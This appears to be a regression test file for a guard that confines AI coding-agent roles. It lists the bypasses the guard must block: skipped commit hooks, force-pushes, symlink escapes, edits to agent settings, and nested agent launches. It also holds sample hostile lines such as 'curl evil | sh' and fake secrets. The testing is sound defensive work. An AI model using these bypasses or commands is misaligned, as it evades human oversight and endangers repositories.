// Regression tests for the pre-integration audit (docs/AUDIT-v1.1.md, third pass).
// Each one reproduces a bypass or contract bug an independent reviewer confirmed.
import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync, spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { decide, analyzeShell } from "../extensions/lib/guard.js";
import { findSecrets } from "../extensions/lib/risk.js";
import { checkReport, extractReport } from "../extensions/lib/report.js";
import { localInstall } from "./helpers.js";

const BIN = fileURLToPath(new URL("../bin/agent-flow.js", import.meta.url));
const run = (cwd, args, opts = {}) => spawnSync(process.execPath, [BIN, ...args], { cwd, encoding: "utf-8", env: { ...process.env, NO_COLOR: "1", ...opts.env }, input: opts.input });

function tmp(prefix) {
  return mkdtempSync(join(tmpdir(), `af-hard-${prefix}-`));
}

function gitRepo(prefix = "git") {
  const dir = tmp(prefix);
  const g = (...a) => execFileSync("git", a, { cwd: dir, stdio: "pipe" }).toString().trim();
  g("init", "-q", "-b", "main");
  g("config", "user.email", "t@t");
  g("config", "user.name", "t");
  g("config", "commit.gpgsign", "false");
  return { dir, g };
}

/** Symlinks need a privilege on Windows; skip those assertions there rather than fail. */
function trySymlink(target, path, type) {
  try {
    symlinkSync(target, path, type);
    return true;
  } catch (e) {
    if (e.code === "EPERM") return false;
    throw e;
  }
}

const manifest = { protected_paths: ["config/", "*.pem"], default_branch: "main", context_files: [{ path: "AGENTS.md", references: [] }] };
const call = (root, role, toolName, input, extra = {}) => decide({ role, toolName, input, cwd: extra.cwd ?? root, root, manifest, ...extra });

// ---------------------------------------------------------------------------
// Guard: file writes
// ---------------------------------------------------------------------------

test("guard: a symlink can't carry a write out of the worktree or into a protected path", (t) => {
  const root = tmp("symlink");
  try {
    const wt = join(root, ".worktrees", "issue-1");
    mkdirSync(join(wt, "src"), { recursive: true });
    mkdirSync(join(root, "config"), { recursive: true });
    if (!trySymlink("../../..", join(wt, "src", "up"), "dir") || !trySymlink("config", join(root, "cfg"), "dir")) return t.skip("no symlink privilege");
    const impl = (p) => call(root, "implementer", "write", { path: p }, { cwd: wt, worktree: wt });
    assert.ok(impl("src/up/config/secrets.yml"), "worktree symlink → protected config/");
    assert.ok(impl("src/up/README.md"), "worktree symlink → repo root is outside the worktree");
    assert.ok(impl("src/up/.git/hooks/pre-commit"));
    assert.equal(impl("src/ok.ts"), null, "an ordinary write inside the worktree is fine");
    assert.equal(call(root, "orchestrator", "write", { path: "cfg/secrets.yml" })?.rule, "protected-path", "alias to a protected dir");
    assert.equal(call(root, null, "write", { path: "cfg/secrets.yml" })?.rule, "protected-path", "even with no role");
    // A dangling symlink: writeFile follows it and creates the target.
    if (trySymlink(join(root, "config", "new.yml"), join(root, "dangling"), "file")) {
      assert.equal(call(root, null, "write", { path: "dangling" })?.rule, "protected-path");
    }
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("guard: custom and harness write tools are recognised whatever their naming", () => {
  const root = tmp("tools");
  try {
    for (const name of ["writeFile", "createFile", "Write", "Edit", "MultiEdit", "NotebookEdit", "mcp__fs__write_file", "str_replace_editor", "apply_patch"]) {
      assert.ok(call(root, "reviewer", name, { path: "x.ts" }), `${name} must be blocked for a reviewer`);
    }
    for (const name of ["TodoWrite", "Read", "Grep", "mcp__fs__read_file"]) {
      assert.equal(call(root, "reviewer", name, { path: "x.ts" }), null, `${name} is not a file write`);
    }
    const wt = join(root, ".worktrees", "issue-1");
    mkdirSync(wt, { recursive: true });
    const impl = (tool, input) => call(root, "implementer", tool, input, { cwd: wt, worktree: wt });
    assert.ok(impl("NotebookEdit", { notebook_path: "/tmp/outside.ipynb" }), "notebook_path");
    assert.ok(impl("MultiEdit", { edits: [{ file_path: "/etc/passwd" }] }), "paths inside an edits[] batch");
    assert.ok(impl("apply_patch", { input: "*** Begin Patch\n*** Update File: ../../config/secrets.yml\n" }), "Codex-style patch header");
    assert.ok(impl("apply_patch", { patch: "--- a/x\n+++ b/../../../etc/x\n" }), "unified-diff header");
    assert.equal(impl("some_custom_write", {})?.rule, "unknown-target", "a confined role fails closed when it can't see the target");
    assert.equal(call(root, null, "some_custom_write", {}), null, "an unconfined session isn't bricked by it");
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("guard: agents can't edit what constrains them (agent definitions, skills, CI)", () => {
  const root = tmp("cfg");
  try {
    for (const p of [".claude/agents/reviewer.md", ".claude/settings.json", ".codex/agents/reviewer.toml", ".agents/skills/qa/SKILL.md", ".github/workflows/ci.yml"]) {
      assert.equal(call(root, "gardener", "write", { path: p })?.rule, "agent-config", `gardener → ${p}`);
      assert.equal(call(root, "orchestrator", "write", { path: p })?.rule, "agent-config", `orchestrator → ${p}`);
    }
    assert.equal(call(root, null, "write", { path: ".claude/settings.json" }), null, "a human session still can");
    assert.equal(call(root, "gardener", "write", { path: "AGENTS.md" }), null, "the gardener still edits context");
    assert.equal(call(root, "implementer", "bash", { command: "rm .github/workflows/ci.yml" })?.rule, "agent-config");
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// Guard: shell
// ---------------------------------------------------------------------------

test("guard: every way to skip the pre-commit hook is blocked", () => {
  const root = tmp("noverify");
  try {
    for (const cmd of [
      "git commit --no-verify -m x",
      "git commit -n -m x",
      "git commit -nm x",
      "git commit -anm x",
      "git -c core.hooksPath=/dev/null commit -m x",
      "git config core.hooksPath /dev/null",
      "git -C . config --local core.hooksPath x",
      'git -c "core.hooksPath=/dev/null" commit -m x',
      "git push --no-verify origin agent/issue-1",
    ]) {
      assert.equal(call(root, "implementer", "bash", { command: cmd })?.rule, "no-verify", cmd);
    }
    assert.equal(call(root, "implementer", "bash", { command: "git commit -am 'fix n+1 query'" }), null, "a message containing n is fine");
    assert.equal(call(root, "implementer", "bash", { command: "git push -n origin agent/issue-1" }), null, "push -n is --dry-run");
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("guard: force-pushes and pushes to the default branch are blocked in every spelling", () => {
  const root = tmp("push");
  try {
    const push = (cmd) => call(root, "implementer", "bash", { command: cmd })?.rule ?? null;
    for (const cmd of ["git push --force origin b", "git push -fu origin b", "git push -uf origin b", "git --no-pager push -f origin b", "git push origin +b", "git push --force-with-lease origin b", "git push --mirror origin", "git push -d origin b", "git push origin --delete b"]) {
      assert.equal(push(cmd), "force-push", cmd);
    }
    for (const cmd of ["git push origin main", "git push origin HEAD:main", "git push origin HEAD:refs/heads/main", "git push origin refs/heads/main", "git push origin :main", "git push --all origin", "git -C wt push origin master"]) {
      assert.equal(push(cmd), "push-default-branch", cmd);
    }
    assert.equal(push("git push -u origin agent/issue-1"), null);
    assert.equal(push("git push origin agent/issue-1:agent/issue-1"), null);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("guard: nested agent launches are caught behind npx, sh -c and versions", () => {
  const root = tmp("nested");
  try {
    for (const cmd of ["npx claude -p hi", "npx -y @anthropic-ai/claude-code -p hi", "bash -c 'pi -p hi'", "sh -lc \"codex exec hi\"", "npx @openai/codex@latest exec x", "bunx gemini -p x"]) {
      assert.equal(call(root, "qa", "bash", { command: cmd })?.rule, "role-escalation", cmd);
    }
    assert.equal(call(root, "orchestrator", "bash", { command: "AGENT_FLOW_ROLE=reviewer claude -p --agent reviewer x" }), null, "the orchestrator launches roles");
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("guard: common accidental writes are caught for read-only roles", () => {
  const root = tmp("ro");
  try {
    for (const cmd of [
      "sed -e s/a/b/ -i f",
      "sed -E -i s/a/b/ f",
      "python3 - <<'EOF'\nopen('f','w').write('x')\nEOF",
      "gofmt -w .",
      "go fmt ./...",
      "black .",
      "cargo fmt",
      "ruff format .",
      "npm install",
      "bash -c 'rm -rf dist'",
    ]) {
      assert.ok(call(root, "reviewer", "bash", { command: cmd }), cmd);
    }
    for (const cmd of ["black --check .", "cargo fmt --check", "ruff format --diff .", "gofmt -l .", "npm test", "git diff main...HEAD", "grep -rn TODO src"]) {
      assert.equal(call(root, "reviewer", "bash", { command: cmd }), null, `${cmd} is read-only`);
    }
    assert.equal(call(root, "qa", "bash", { command: "npm ci && npm test" }), null, "QA may do a clean lockfile install");
    assert.ok(call(root, "qa", "bash", { command: "npm install && npm test" }), "…but not one that can rewrite the lockfile");
    assert.ok(analyzeShell("eval 'rm -rf x'").mutating, "eval'd commands are analysed too");
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// Claude Code hook adapter (`agent-flow guard`)
// ---------------------------------------------------------------------------

test("guard CLI speaks Claude Code's PreToolUse contract: exit 2 + stderr blocks, exit 0 allows", () => {
  const { dir } = gitRepo("hook");
  try {
    writeFileSync(join(dir, "CONTEXT_MANIFEST.json"), JSON.stringify({ protected_paths: ["migrations/"], context_files: [] }));
    const hook = (payload, env = {}) => run(dir, ["guard"], { input: JSON.stringify({ hook_event_name: "PreToolUse", cwd: dir, ...payload }), env });

    const blocked = hook({ tool_name: "Write", tool_input: { file_path: join(dir, "migrations", "002.sql"), content: "x" } });
    assert.equal(blocked.status, 2, blocked.stderr);
    assert.match(blocked.stderr, /protected/);

    assert.equal(hook({ tool_name: "Write", tool_input: { file_path: join(dir, "src", "a.ts") } }).status, 0);
    assert.equal(hook({ tool_name: "Bash", tool_input: { command: "ls" } }, { AGENT_FLOW_ROLE: "reviewer" }).status, 0);
    assert.equal(hook({ tool_name: "Bash", tool_input: { command: "rm -rf src" } }, { AGENT_FLOW_ROLE: "reviewer" }).status, 2);

    // The orchestrator's reviewer subagent runs as a reviewer, whatever the parent session's role.
    const sub = hook({ tool_name: "Edit", tool_input: { file_path: join(dir, "src", "a.ts") }, agent_type: "reviewer" }, { AGENT_FLOW_ROLE: "orchestrator" });
    assert.equal(sub.status, 2);
    assert.match(sub.stderr, /read-only/);
    assert.equal(hook({ tool_name: "Edit", tool_input: { file_path: join(dir, "src", "a.ts") }, agent_type: "general-purpose" }).status, 0, "unrelated subagents aren't affected");

    // Garbage input: a confined role fails closed, an ordinary session doesn't get bricked.
    assert.equal(run(dir, ["guard"], { input: "not json", env: { AGENT_FLOW_ROLE: "implementer" } }).status, 2);
    assert.equal(run(dir, ["guard"], { input: "not json", env: { AGENT_FLOW_ROLE: "" } }).status, 0);

    const audit = readFileSync(join(dir, ".agent-flow", "audit.jsonl"), "utf-8");
    assert.match(audit, /"harness":"claude"/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("install --harness claude merges the guard hook into existing settings, idempotently", () => {
  const { dir } = gitRepo("settings");
  try {
    const af = localInstall(dir);
    mkdirSync(join(dir, ".claude"), { recursive: true });
    writeFileSync(join(dir, ".claude", "settings.json"), JSON.stringify({ model: "x", permissions: { deny: ["Read(.env)"] }, hooks: { PreToolUse: [{ matcher: "Bash", hooks: [{ type: "command", command: "mine.sh" }] }] } }));
    assert.equal(af(dir, "install", "--harness", "claude").status, 0);
    const s = JSON.parse(readFileSync(join(dir, ".claude", "settings.json"), "utf-8"));
    assert.equal(s.model, "x", "unrelated settings are kept");
    assert.deepEqual(s.permissions.deny, ["Read(.env)"]);
    assert.equal(s.hooks.PreToolUse.length, 2, "the user's own hook is kept");
    const ours = s.hooks.PreToolUse.find((e) => /agent-flow/.test(e.hooks[0].command));
    assert.match(ours.hooks[0].command, /\$CLAUDE_PROJECT_DIR\/node_modules\/@drix10\/agent-flow\/bin\/agent-flow\.js" guard$/);
    assert.match(ours.matcher, /Write/);
    assert.equal(af(dir, "install", "--harness", "claude").status, 0);
    assert.equal(JSON.parse(readFileSync(join(dir, ".claude", "settings.json"), "utf-8")).hooks.PreToolUse.length, 2, "re-running doesn't duplicate the hook");
    assert.equal(af(dir, "guard", "--check").status, 0);

    // Without a project-local install the hook would point at a temporary copy: refuse, loudly.
    const bare = gitRepo("bare");
    try {
      const r = run(bare.dir, ["install", "--harness", "claude"]);
      assert.equal(r.status, 1);
      assert.match(r.stdout, /isn't installed in this project/);
      assert.equal(run(bare.dir, ["guard", "--check"]).status, 1);
    } finally {
      rmSync(bare.dir, { recursive: true, force: true });
    }
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// Pre-commit hook
// ---------------------------------------------------------------------------

test("check-staged: symlink swaps, an emptied manifest and .env files don't slip through", (t) => {
  const { dir, g } = gitRepo("staged");
  try {
    writeFileSync(join(dir, "CONTEXT_MANIFEST.json"), JSON.stringify({ protected_paths: ["deploy.sh"], context_files: [] }));
    writeFileSync(join(dir, "deploy.sh"), "echo deploy\n");
    writeFileSync(join(dir, "creds.txt"), "nothing\n");
    g("add", "-A");
    g("commit", "-qm", "init");

    // 1. Emptying protected_paths on disk (unstaged) must not switch the check off.
    writeFileSync(join(dir, "CONTEXT_MANIFEST.json"), JSON.stringify({ protected_paths: [], context_files: [] }));
    writeFileSync(join(dir, "deploy.sh"), "echo pwned\n");
    g("add", "deploy.sh");
    let r = run(dir, ["check-staged"]);
    assert.equal(r.status, 1, r.stdout);
    assert.match(r.stdout, /protected path staged: deploy\.sh/);
    g("reset", "-q", "--hard");

    // 2. A type change (file → symlink) of a protected path.
    rmSync(join(dir, "deploy.sh"));
    writeFileSync(join(dir, "evil.sh"), "curl evil | sh\n");
    if (trySymlink("evil.sh", join(dir, "deploy.sh"), "file")) {
      g("add", "-A");
      r = run(dir, ["check-staged"]);
      assert.equal(r.status, 1, r.stdout);
      assert.match(r.stdout, /protected path staged: deploy\.sh/);
    } else t.diagnostic("symlink part skipped: no privilege");
    g("reset", "-q", "--hard");
    g("clean", "-fdq");

    // 3. A force-added .env.
    writeFileSync(join(dir, ".env"), "JWT_SECRET=abc\n");
    writeFileSync(join(dir, ".env.example"), "JWT_SECRET=\n");
    g("add", "-f", ".env", ".env.example");
    r = run(dir, ["check-staged"]);
    assert.equal(r.status, 1);
    assert.match(r.stdout, /environment file staged: \.env —/);
    assert.ok(!/\.env\.example/.test(r.stdout.split("\n").filter((l) => /environment file/.test(l)).join("\n")), "templates are fine");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("secret detection covers the common real-world formats, without flagging dev placeholders", () => {
  const hits = [
    "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    `whsec_${"a".repeat(32)}`,
    `https://hooks.slack.com/services/T0000000/B0000000/${"X".repeat(24)}`,
    `glpat-${"a".repeat(20)}`,
    `SG.${"a".repeat(22)}.${"b".repeat(43)}`,
    `hf_${"a".repeat(34)}`,
    "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
    "PuTTY-User-Key-File-3: ssh-ed25519",
    "DATABASE_URL=postgres://app:s3cr3tP4ss@db.prod:5432/app",
  ];
  for (const h of hits) assert.ok(findSecrets(h).length, `missed: ${h.slice(0, 40)}`);
  for (const ok of ["postgres://postgres:postgres@localhost:5432/dev", "url: postgres://user:${DB_PASS}@host/db", "const k = process.env.AWS_SECRET_ACCESS_KEY"]) {
    assert.equal(findSecrets(ok).length, 0, `false positive: ${ok}`);
  }
});

// ---------------------------------------------------------------------------
// Classifier
// ---------------------------------------------------------------------------

test("classify ignores commits that landed on the base after the branch was cut", () => {
  const { dir, g } = gitRepo("drift");
  try {
    writeFileSync(join(dir, "README.md"), "x\n");
    g("add", "-A");
    g("commit", "-qm", "init");
    const created = JSON.parse(run(dir, ["worktree", "create", "7", "--json"]).stdout);
    const wt = join(dir, created.path);
    writeFileSync(join(wt, "new.ts"), "export {};\n");
    execFileSync("git", ["add", "-A"], { cwd: wt });
    execFileSync("git", ["commit", "-qm", "branch work"], { cwd: wt });
    mkdirSync(join(dir, "src", "auth"), { recursive: true });
    writeFileSync(join(dir, "src", "auth", "login.ts"), "export {};\n");
    g("add", "-A");
    g("commit", "-qm", "someone else's work on main");

    const c = JSON.parse(run(dir, ["classify", "--issue", "7", "--json"]).stdout);
    assert.deepEqual(c.files, ["new.ts"], "only this branch's change");
    assert.equal(c.risk_level, "low");
    assert.equal(c.base, "main");

    // A custom base recorded at creation is used by classify too.
    g("branch", "release");
    const rel = JSON.parse(run(dir, ["worktree", "create", "8", "--base", "release", "--json"]).stdout);
    assert.equal(rel.base, "release");
    assert.equal(JSON.parse(run(dir, ["classify", "--issue", "8", "--json"]).stdout).base, "release");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// Role reports + state CLI
// ---------------------------------------------------------------------------

const goodReview = { status: "approved", round: 1, summary: "ok", findings: [], criteria: [{ criterion: "c", met: true, evidence: "t" }] };

test("report extraction handles every harness's output shape", () => {
  const envelope = JSON.stringify({ type: "result", subtype: "success", result: "…", structured_output: goodReview });
  assert.equal(extractReport(envelope).source, "claude structured_output");
  const inResult = JSON.stringify({ type: "result", result: `Done.\n\`\`\`json\n${JSON.stringify(goodReview)}\n\`\`\`` });
  assert.deepEqual(extractReport(inResult).value, goodReview);
  assert.deepEqual(extractReport(`Here you go:\n${JSON.stringify(goodReview)}\nThanks {not json}`).value, goodReview);
  assert.deepEqual(extractReport(`{"a":1} then the real one ${JSON.stringify(goodReview)}`).value, goodReview, "the last object wins");
  assert.equal(extractReport("no json at all").value, undefined);
});

test("report validation rejects contradictions the orchestrator would route wrongly on", () => {
  assert.ok(checkReport("reviewer", JSON.stringify(goodReview)).ok);
  const bad = (role, obj) => checkReport(role, JSON.stringify(obj)).problems.join("; ");
  assert.match(bad("reviewer", { ...goodReview, findings: [{ severity: "blocking", category: "IMPL_ERROR", issue: "x", evidence: "y" }] }), /approved but a finding is blocking/);
  assert.match(bad("reviewer", { ...goodReview, findings: [{ severity: "warning", category: "SPEC_ERROR", issue: "x", evidence: "y" }] }), /SPEC_ERROR/);
  assert.match(bad("reviewer", { ...goodReview, status: "lgtm" }), /must be one of/);
  assert.match(bad("reviewer", { status: "approved" }), /\$\.round: required/);
  assert.match(bad("implementer", { status: "needs_me", issue: 1 }), /what_failed/);
  assert.match(bad("implementer", { status: "ready_for_review", issue: 1 }), /commit/);
  assert.match(bad("qa", { status: "passed", issue: 1, commands: [{ name: "t", command: "npm test", exit_code: 1, raw_output: "" }] }), /exited non-zero/);
  assert.ok(checkReport("qa", JSON.stringify({ status: "passed_with_flaky", issue: 1, commands: [{ name: "t", command: "npm test", exit_code: 1, rerun_exit_code: 0, raw_output: "" }], flaky: ["a"] })).ok);
});

test("report CLI: validates, normalises to --out, decodes UTF-16 from PowerShell 5.1", () => {
  const dir = tmp("report");
  try {
    const raw = join(dir, "review-r1.raw");
    writeFileSync(raw, Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(`Sure!\n${JSON.stringify(goodReview)}`, "utf16le")]));
    const r = run(dir, ["report", "reviewer", raw, "--out", join(dir, "review-r1.json")]);
    assert.equal(r.status, 0, r.stdout + r.stderr);
    assert.deepEqual(JSON.parse(readFileSync(join(dir, "review-r1.json"), "utf-8")), goodReview);
    writeFileSync(raw, "I approve!");
    assert.equal(run(dir, ["report", "reviewer", raw]).status, 1);
    assert.equal(run(dir, ["schema", "--dir", dir]).status, 0);
    assert.equal(JSON.parse(readFileSync(join(dir, "review.schema.json"), "utf-8")).title, "agent-flow review");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("state CLI: per-issue view with the round limit, and a distinct exit code on escalation", () => {
  const { dir } = gitRepo("statecli");
  try {
    assert.equal(run(dir, ["state", "update", "--issue", "4", "--state", "Working", "--round", "1"]).status, 0);
    const view = JSON.parse(run(dir, ["state", "show", "--issue", "4", "--json"]).stdout);
    assert.equal(view.state, "Working");
    assert.equal(view.max_review_rounds, 2);
    assert.equal(JSON.parse(run(dir, ["state", "show", "--issue", "99", "--json"]).stdout).state, null);
    assert.equal(run(dir, ["state", "update", "--issue", "4", "--state", "Working", "--round", "2"]).status, 0);
    const esc = run(dir, ["state", "update", "--issue", "4", "--state", "Working", "--round", "3", "--json"]);
    assert.equal(esc.status, 3, "escalation must not look like success to a script");
    assert.equal(JSON.parse(esc.stdout).state, "Needs Me");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("prose drift ignores placeholder tokens like `agent/issue-N`", async () => {
  const { extractProseRefs } = await import("../extensions/lib/stale.js");
  const refs = extractProseRefs("PRs come from `agent/issue-N`; see `packages/X` and `src/real.ts`.").map((r) => r.path);
  assert.deepEqual(refs, ["src/real.ts"]);
});
